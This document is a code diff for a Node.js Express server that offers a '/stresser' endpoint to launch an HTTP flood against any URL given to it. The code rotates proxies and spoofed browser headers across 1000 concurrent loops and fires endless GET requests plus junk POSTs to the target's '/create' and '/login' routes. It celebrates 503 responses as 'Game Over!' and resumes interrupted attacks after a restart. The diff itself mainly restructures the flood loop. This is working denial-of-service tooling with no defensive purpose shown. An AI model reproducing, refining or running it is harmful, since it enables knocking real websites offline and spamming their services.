@@ -10,18 +10,12 @@ const { fakeState } = require("./fakeState.js");
 const app = express();
 app.use(express.json());
 
-const amount_requestsPerMS = 1; // Added constant for requests per millisecond
-
 const stateFilePath = path.join(__dirname, 'attackState.json');
 
 const ensureStateFileExists = () => {
     if (!fs.existsSync(stateFilePath)) {
         fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, startTime: null, duration: 0, targetUrl: null }));
     }
-};
-
-const saveState = (state) => {
-    fs.writeFileSync(stateFilePath, JSON.stringify(state));
 };
 
 const loadState = () => {
@@ -35,17 +29,19 @@ const loadState = () => {
     }
 };
 
-const initialState = loadState();
-let continueAttack = initialState.continueAttack;
-let startTime = initialState.startTime;
-let duration = initialState.duration;
-let targetUrl = initialState.targetUrl;
+let state = loadState();
+let continueAttack = state.continueAttack;
+let startTime = state.startTime;
+let duration = state.duration;
+let targetUrl = state.targetUrl;
 
-// Check if attack should continue based on current time
+// Check if attack should continue based on duration
 if (continueAttack && startTime && duration) {
     const endTime = startTime + duration;
     if (Date.now() > endTime) {
         continueAttack = false;
+        state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+        fs.writeFileSync(stateFilePath, JSON.stringify(state));
     }
 }
 
@@ -55,7 +51,7 @@ const langHeaders = [
     "en-US,en;q=0.5",
     "en-US,en;q=0.9",
     "de-CH;q=0.7",
-    "da, en -gb;q=0.8, en;q=0.7",
+    "da, en-gb;q=0.8, en;q=0.7",
     "cs;q=0.5",
     "en-US,en;q=0.9",
     "en-GB,en;q=0.9",
@@ -100,7 +96,8 @@ const acceptHeaders = [
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const numThreads = 10000;
+const requestsPerSecond = 10000000;
+const numThreads = 1000;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");
@@ -123,14 +120,18 @@ const loadProxies = () => {
 };
 
 const performAttack = (url, agent) => {
-    // Check if attack duration has passed
-    if (startTime && duration && Date.now() > startTime + duration) {
-        continueAttack = false;
-        saveState({ continueAttack, startTime, duration, targetUrl });
-        return;
-    }
-    
     if (!continueAttack) return;
+
+    // Check if attack duration has expired
+    if (startTime && duration) {
+        const endTime = startTime + duration;
+        if (Date.now() > endTime) {
+            continueAttack = false;
+            state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+            fs.writeFileSync(stateFilePath, JSON.stringify(state));
+            return;
+        }
+    }
 
     const headersForRequest = {
         "Content-Type": "application/x-www-form-urlencoded",
@@ -169,73 +170,69 @@ const performAttack = (url, agent) => {
         "X-Permitted-Cross-Domain-Policies": "none",
         "X-Powered-By": "PHP/7.4.3",
     };
-    
-    // Send multiple requests based on amount_requestsPerMS
-    for (let i = 0; i < amount_requestsPerMS; i++) {
-        try {
-            const urlMatch = url.match(/^(https?:\/\/[^\/]+)/);
-            if (urlMatch && urlMatch[0]) {
-                axios.post(urlMatch[0] + "/create", {
-                    appstate: fakeState(),
-                    botname: ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)],
-                    botadmin: Array.from({ length: 14 }, () => Math.floor(Math.random() * 10)).join(''),
-                    botprefix: '!@#$%^&*()_+{}|:"<>?`~[];\',./'[Math.floor(Math.random() * 28)],
-                    username: `${['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)]}${Array.from({ length: 4 }, () => Math.random().toString(36).charAt(2)).join('')}${Array.from({ length: 2 }, () => Math.floor(Math.random() * 10)).join('')}`
-                })
-                .catch(() => {});
-            }
-        } catch (e) {}
-    }
-    
-    for (let i = 0; i < amount_requestsPerMS; i++) {
-        try {
-            const urlMatch = url.match(/^(https?:\/\/[^\/]+)/);
-            if (urlMatch && urlMatch[0]) {
-                axios.post(urlMatch[0] + "/login", {
-                    state: fakeState()
-                })
-                .catch(() => {});
-            }
-        } catch (e) {}
-    }
 
-    for (let i = 0; i < amount_requestsPerMS; i++) {
-        axios.get(url, {
-            httpAgent: agent,
-            headers: headersForRequest,
-            timeout: 0,
-        })
+    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/create", {
+        appstate: fakeState(),
+        botname: ['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)],
+        botadmin: Array.from({ length: 14 }, () => Math.floor(Math.random() * 10)).join(''),
+        botprefix: '!@#$%^&*()_+{}|:"<>?`~[];\',./'[Math.floor(Math.random() * 28)],
+        username: `${['Alpha', 'Beta', 'Gamma', 'Delta', 'Epsilon', 'Zeta', 'Eta', 'Theta'][Math.floor(Math.random() * 8)]}${Array.from({ length: 4 }, () => Math.random().toString(36).charAt(2)).join('')}${Array.from({ length: 2 }, () => Math.floor(Math.random() * 10)).join('')}`
+    }, { httpAgent: agent, headers: headersForRequest })
         .then(() => {
-            console.log(rainbow("SERVER STILL ALIVE!"));        
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+
+    axios.post(url.match(/^(https?:\/\/[^\/]+)/)[0] + "/login", {
+        state: fakeState()
+    }, { httpAgent: agent, headers: headersForRequest })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        })
+        .catch(() => {
+            setTimeout(() => performAttack(url, agent), 0);
+        });
+
+    axios.get(url, {
+        httpAgent: agent,
+        headers: headersForRequest,
+        timeout: 0,
+    })
+        .then(() => {
+            setTimeout(() => performAttack(url, agent), 0);
         })
         .catch((err) => {
-            if (err.response?.status === 503) {
+            if (err.code === "ECONNRESET" || err.code === "ECONNREFUSED" || err.code === "EHOSTUNREACH" || err.code === "ETIMEDOUT" || err.code === "EAI_AGAIN" || err.message === "Socket is closed") {
+                // console.log(rainbow("Unable to Attack Target Server Refused!"));
+            } else if (err.response?.status === 404) {
+                // console.log(rainbow("Target returned 404 (Not Found). Stopping further attacks."));
+            } else if (err.response?.status === 503) {
                 console.log(rainbow("Target under heavy load (503) - Game Over!"));
             } else if (err.response?.status === 502) {
                 console.log(rainbow("Bad Gateway (502)."));
+            } else if (err.response?.status === 403) {
+                // console.log(rainbow("Forbidden (403)."));
+            } else if (err.response?.status) {
+                // console.log(rainbow(`DDOS Status: (${err.response?.status})`));
+            } else {
+                // console.log(rainbow(err.message || "ATTACK FAILED!"));
             }
-                console.log(rainbow(`FAIL => KEEP ATTACKING UNTIL IT OVERLOADED!... ${err.response?.status})`))
+            setTimeout(() => performAttack(url, agent), 0);
         });
-    }
-
-    // Only continue if the attack duration hasn't passed
-    if (startTime && duration && Date.now() <= startTime + duration) {
-        setTimeout(() => performAttack(url, agent), 0);
-    } else if (!startTime || !duration) {
-        setTimeout(() => performAttack(url, agent), 0);
-    }
 };
 
 const startAttack = (url, durationHours) => {
     if (!url || !/^https?:\/\//.test(url)) {
         console.error("Invalid URL. Please provide a valid URL starting with http:// or https://");
-        return;
+        return false;
     }
 
     const proxies = loadProxies();
     if (!proxies.length) {
         console.error("No proxies found. Please add proxies to the proxy file.");
-        return;
+        return false;
     }
 
     continueAttack = true;
@@ -243,8 +240,15 @@ const startAttack = (url, durationHours) => {
     startTime = Date.now();
     duration = durationHours * 60 * 60 * 1000; // convert hours to milliseconds
 
-    // Save the new state once when starting the attack
-    saveState({ continueAttack, startTime, duration, targetUrl });
+    // Save state only once when attack starts
+    state = { continueAttack, startTime, duration, targetUrl };
+    fs.writeFileSync(stateFilePath, JSON.stringify(state));
+
+    const attackTimeout = setTimeout(() => {
+        continueAttack = false;
+        state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+        fs.writeFileSync(stateFilePath, JSON.stringify(state));
+    }, duration);
 
     for (let i = 0; i < numThreads; i++) {
         if (!continueAttack) break;
@@ -257,40 +261,39 @@ const startAttack = (url, durationHours) => {
 
         performAttack(url, agent);
     }
+    return true;
 };
 
 app.get("/stresser", (req, res) => {
     const url = req.query.url;
     const durationHours = parseFloat(req.query.duration) || 1;
+
     if (!url || !/^https?:\/\//.test(url)) {
         return res.status(400).json({ error: "Invalid URL. Please provide a valid URL starting with http:// or https://." });
     }
     if (isNaN(durationHours) || durationHours <= 0) {
         return res.status(400).json({ error: "Invalid duration. Please provide a positive duration in hours." });
     }
-    targetUrl = url;
-    startAttack(targetUrl, durationHours);
-    res.json({ message: "Starting DDOS ATTACK..." });
+
+    if (startAttack(url, durationHours)) {
+        res.json({ message: "Starting DDOS ATTACK..." });
+    } else {
+        res.status(500).json({ error: "Failed to start attack. Check server logs for details." });
+    }
 });
 
 const port = process.env.PORT || 25694 || Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
 app.listen(port, () => {
     console.log(rainbow(`API running on http://localhost:${port}`));
     if (continueAttack && startTime && duration) {
-        const currentTime = Date.now();
-        const endTime = startTime + duration;
-        // Only resume if the attack duration hasn't passed
-        if (currentTime < endTime) {
-            console.log(rainbow('Resuming previous attack...'));
-            const remainingDuration = (endTime - currentTime) / (60 * 60 * 1000); // convert milliseconds back to hours
-            if (remainingDuration > 0) {
-                startAttack(targetUrl, remainingDuration);
-            }
+        console.log(rainbow('Resuming previous attack...'));
+        const remainingDuration = (startTime + duration - Date.now()) / (60 * 60 * 1000); // convert milliseconds back to hours
+        if (remainingDuration > 0) {
+            startAttack(targetUrl, remainingDuration);
         } else {
-            // Attack duration has passed, update state to stop attack
             continueAttack = false;
-            saveState({ continueAttack, startTime, duration, targetUrl });
-            console.log(rainbow('Previous attack duration has expired.'));
+            state = { continueAttack: false, startTime: null, duration: 0, targetUrl: null };
+            fs.writeFileSync(stateFilePath, JSON.stringify(state));
         }
     }
 });
